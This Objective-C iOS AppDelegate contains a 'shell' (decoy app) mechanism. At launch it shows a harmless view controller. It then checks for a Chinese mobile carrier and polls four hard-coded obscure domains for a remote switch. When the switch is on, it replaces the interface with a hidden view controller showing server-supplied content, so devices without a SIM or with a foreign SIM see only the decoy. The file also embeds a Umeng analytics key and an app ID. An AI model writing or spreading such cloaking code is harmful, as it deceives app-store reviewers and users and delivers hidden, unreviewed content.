#import "AppDelegate.h"
#import "MyViewController.h"

/************************* shell ***************************/
#import "HideViewController.h"
#import "RequestManager.h"
#import <NSObject+YYModel.h>
#import <AFNetworking.h>
#import "CBToast.h"
#import <NSObject+YYModel.h>
#import "HideModel.h"
#import "HideData.h"
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreTelephony/CTCarrier.h>

#define myapi1 @"https://yyhdf.rjvrm.cn/app/info"
#define myapi2 @"https://dfagg.wmfqh.cn/app/info"
#define myapi3 @"https://oousd.goto898.com/app/info"
#define myapi4 @"https://trytsf.while898.com/app/info"

#import <UMCommon/UMCommon.h>
#import <UMAnalytics/MobClick.h>
#import <UMPush/UMessage.h>

#define APPID @"aa6c031af129edc1d92b8faf070464fd"
#define umengKey @"5d24758b570df3dda200064d"
/************************* shell ***************************/

@interface AppDelegate ()<UNUserNotificationCenterDelegate>

@property(nonatomic, assign) BOOL blockRotation;
@property(nonatomic, assign) int tryNum;

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];
    [self.window makeKeyAndVisible];
    self.window.backgroundColor=[UIColor whiteColor];
    
    self.window.rootViewController = [MyViewController new];
    
    
    /************************* shell ***************************/
    [[NSHTTPCookieStorage sharedHTTPCookieStorage] setCookieAcceptPolicy:NSHTTPCookieAcceptPolicyAlways];
    [self umeng];
    [self umengPush:launchOptions];
    
    self.blockRotation = NO;
    self.tryNum = 1;
//    [self judgeNetworking];
#pragma 生产环境时切换下面这个方法
    [self obtainOperator];//判断运营商
    /************************* shell ***************************/
    
    return YES;
}

/************************* shell ***************************/
-(void)obtainOperator{
    //获取本机运营商名称
    CTTelephonyNetworkInfo *info = [[CTTelephonyNetworkInfo alloc] init];
    CTCarrier *carrier = [info subscriberCellularProvider];
    //当前手机所属运营商名称
    NSString *mobile;
    //先判断有没有SIM卡，如果没有则不获取本机运营商
    if (!carrier.isoCountryCode) {
        NSLog(@"没有SIM卡,显示壳子内容");
        mobile = @"无运营商";
    }else{
        mobile = [carrier carrierName];
        if ([mobile containsString:@"联通"]||[mobile containsString:@"移动"]||[mobile containsString:@"电信"]||[mobile containsString:@"铁通"]) {
            [self judgeNetworking];
        }else{
            NSLog(@"国外的卡,显示壳子内容");
        }
    }
    NSLog(@"%@", mobile);
}

-(void)judgeNetworking{
    //1.创建网络监听管理者
    AFNetworkReachabilityManager *manager = [AFNetworkReachabilityManager sharedManager];
    [manager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
        switch (status) {
            case AFNetworkReachabilityStatusUnknown:
                NSLog(@"未知");
                [CBToast showToast:@"网络状态不太好" location:@"center" showTime:5.0];
                break;
            case AFNetworkReachabilityStatusNotReachable:
                NSLog(@"没有网络");
                [CBToast showToast:@"没有网络" location:@"center" showTime:5.0];
                break;
            case AFNetworkReachabilityStatusReachableViaWWAN:
                NSLog(@"3G/4G");
                [self loadData:myapi1];
                break;
            case AFNetworkReachabilityStatusReachableViaWiFi:
                NSLog(@"WIFI");
                [self loadData:myapi1];
                break;
            default:
                break;
        }
    }];
    //3.开始监听
    [manager startMonitoring];
}

-(void)loadData:(NSString *)urlStr {
    NSDictionary *parameters = @{@"a":APPID, @"b":@"2"};
    [[RequestManager sharedManager] postRequest:urlStr parameters:parameters success:^(id  _Nonnull responseObject) {
        NSLog(@"responseObject:%@", responseObject);
        HideModel *model = [HideModel yy_modelWithJSON:responseObject];
        if ([model.msg isEqualToString:@"SUCCESS"]) {
            HideData *data = model.data;
            if ([data.switchOn isEqualToString:@"1"]) {
                self.blockRotation = YES;
                HideViewController *hideVC = [HideViewController new];
                hideVC.model = data;
                self.window.rootViewController = hideVC;
            }
        }
    } failure:^(NSError * _Nonnull error) {
        NSLog(@"%@", error);
        self.tryNum++;
        switch (self.tryNum) {
            case 2:
                [self loadData:myapi2];
                break;
            case 3:
                [self loadData:myapi3];
                break;
            case 4:
                [self loadData:myapi4];
                break;
            default:
                break;
        }
    }];
}

-(UIInterfaceOrientationMask)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window{
    if (self.blockRotation) {
        return UIInterfaceOrientationMaskAll;
    }else{
        return UIInterfaceOrientationMaskPortrait;
    }
}


//初始化umeng
-(void)umeng{
    //初始化友盟所有组件产品
    [UMConfigure initWithAppkey:umengKey channel:@"App Store"];
    //场景设置
    [MobClick setScenarioType:E_UM_NORMAL];//支持普通场景
    //设置为自动采集页面
    [MobClick setAutoPageEnabled:YES];
}

//push
-(void)umengPush:(NSDictionary *)launchOptions{
    // Push组件基本功能配置
    UMessageRegisterEntity *entity = [[UMessageRegisterEntity alloc] init];
    //type是对推送的几个参数的选择，可以选择一个或者多个。默认是三个全部打开，即：声音，弹窗，角标
    entity.types = UMessageAuthorizationOptionBadge|UMessageAuthorizationOptionSound|UMessageAuthorizationOptionAlert;
    [UNUserNotificationCenter currentNotificationCenter].delegate=self;
    [UMessage registerForRemoteNotificationsWithLaunchOptions:launchOptions Entity:entity     completionHandler:^(BOOL granted, NSError * _Nullable error) {
        if (granted) {
            // 用户选择了接收push消息
            NSLog(@"用户选择了接收push消息");
        }else{
            // 用户拒绝接收Push消息
            NSLog(@"用户拒绝接收Push消息");
        }
    }];
}

#pragma 获取device token 然后在友盟官网添加测试设备(注:不添加测试设备,就一直收不到消息)
- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken{
    [UMessage registerDeviceToken:deviceToken];
    NSString *tokenStr = [[[[deviceToken description] stringByReplacingOccurrencesOfString: @"<" withString: @""]
                           stringByReplacingOccurrencesOfString: @">" withString: @""]
                          stringByReplacingOccurrencesOfString: @" " withString: @""];
    //f0099a8c2ff8f33e58a0bbc8911253d62114419978ab571abdef33f20161921d
    NSLog(@"%@",deviceToken);
    NSLog(@"deviceToken:%@",tokenStr);
}

//umeng iOS10以下使用这两个方法接收通知，
-(void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler
{
    [UMessage setAutoAlert:NO];
    if([[[UIDevice currentDevice] systemVersion]intValue] < 10){
        [UMessage didReceiveRemoteNotification:userInfo];
        
        //    self.userInfo = userInfo;
        //    //定制自定的的弹出框
        //    if([UIApplication sharedApplication].applicationState == UIApplicationStateActive)
        //    {
        //        UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"标题"
        //                                                            message:@"Test On ApplicationStateActive"
        //                                                           delegate:self
        //                                                  cancelButtonTitle:@"确定"
        //                                                  otherButtonTitles:nil];
        //
        //        [alertView show];
        //
        //    }
        completionHandler(UIBackgroundFetchResultNewData);
    }
}
//meng iOS10新增：处理前台收到通知的代理方法
-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions))completionHandler{
    NSDictionary * userInfo = notification.request.content.userInfo;
    if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        //应用处于前台时的远程推送接受
        //关闭U-Push自带的弹出框
        [UMessage setAutoAlert:NO];
        //必须加这句代码
        [UMessage didReceiveRemoteNotification:userInfo];
        
    }else{
        //应用处于前台时的本地推送接受
    }
    //当应用处于前台时提示设置，需要哪个可以设置哪一个
    completionHandler(UNNotificationPresentationOptionSound|UNNotificationPresentationOptionBadge|UNNotificationPresentationOptionAlert);
}

//meng iOS10新增：处理后台点击通知的代理方法
-(void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler{
    NSDictionary * userInfo = response.notification.request.content.userInfo;
    if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        //应用处于后台时的远程推送接受
        //必须加这句代码
        [UMessage didReceiveRemoteNotification:userInfo];
    }else{
        //应用处于后台时的本地推送接受
    }
}
/************************* shell ***************************/


- (void)applicationWillResignActive:(UIApplication *)application {

}

- (void)applicationDidEnterBackground:(UIApplication *)application {

}

- (void)applicationWillEnterForeground:(UIApplication *)application {

}

- (void)applicationDidBecomeActive:(UIApplication *)application {

}

- (void)applicationWillTerminate:(UIApplication *)application {

}

@end
